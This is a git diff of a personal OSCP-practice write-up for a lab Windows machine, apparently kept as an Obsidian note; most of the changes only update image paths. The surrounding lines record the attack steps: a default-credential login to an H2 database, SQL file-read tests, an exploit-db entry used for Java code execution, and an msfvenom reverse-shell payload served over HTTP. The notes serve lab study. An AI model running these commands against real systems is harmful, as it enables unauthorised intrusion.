@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-29
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Intermediate
@@ -104,23 +105,23 @@ Host script results:
 
 ## Port 8082 - HTTP (Apache)
 - Navigated to `http://192.168.182.66:80`82 and identified default page for `H2 Database Engine`
-![[Pasted image 20241028212149.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028212149.png]]
 - Attempted login with default credentials `sa:` (No Password) and accessed admin panel
-![[Pasted image 20241028212232.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028212232.png]]
 - Ran SQL query `SELECT FILE_READ('C:\Windows\system.ini', NULL);` to test file read ability
-![[Pasted image 20241028214128.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028214128.png]]
 - Ran `SELECT FILE_WRITE('test','C:\test.txt');` to test file write ability - access is denied to directory.
-![[Pasted image 20241028214439.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028214439.png]]
 - Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Java code on target for code execution
-![[Pasted image 20241028215150.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215150.png]]
 - Copied Java code into SQL field and ran
-![[Pasted image 20241028215317.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215317.png]]
 - Loaded Java native library
-![[Pasted image 20241028215433.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215433.png]]
 - Evaluated script with `whoami` to confirm code execution and identify `jacko/tony`
-![[Pasted image 20241028215550.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215550.png]]
 - Returned to Kali host and ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe > revshell.exe` to create reverse shell executable, then `python3 -m http.server 80` to serve folder with `revshell.exe` via HTTP
-![[Pasted image 20241028215953.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215953.png]]
 - 
 ## Port 49152-60 - MSRPC (Windows RPC)
 No Enumeration conducted
